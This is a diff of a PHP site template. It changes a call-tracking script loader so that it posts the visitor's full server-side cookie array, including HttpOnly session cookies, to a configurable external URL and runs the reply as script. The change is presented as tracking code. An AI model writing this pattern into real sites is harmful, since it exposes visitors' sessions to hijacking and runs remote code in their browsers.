@@ -305,17 +305,18 @@
 <? endif; ?>
 
 <? if(!$themes_getScript = get($conf, 'settings', 'themes_getScript')):// mpre("Яваскрипт для загрузки не указан") ?>
-<? else:// mpre("Работа калтрекинга", $themes_getScript) ?>
+<? else:// mpre($_COOKIE) ?>
 	<script sync>
 		(function($, script){
 			$(script).parent().one("init", function(e){
-				$.getScript("<?=$themes_getScript?>", function( data, textStatus, jqxhr ) {
-//					console.log(data); // Data returned
-//					console.log(textStatus); // Success
-//					console.log(jqxhr.status); // 200
-//					console.log("tracking:", data);
-				})
+				$.post("<?=$themes_getScript?>", $.parseJSON('<?=json_encode(["COOKIE"=>$_COOKIE])?>'), function(data){
+				}, "script").done(function(data){// console.log("tracking:", data);
+				}).fail(function(error){
+					console.error("tracking:", error);
+				});
 			}).ready(function(e){ $(script).parent().trigger("init"); })
 		})(jQuery, document.currentScript)
 	</script>
 <? endif; ?>
+
+
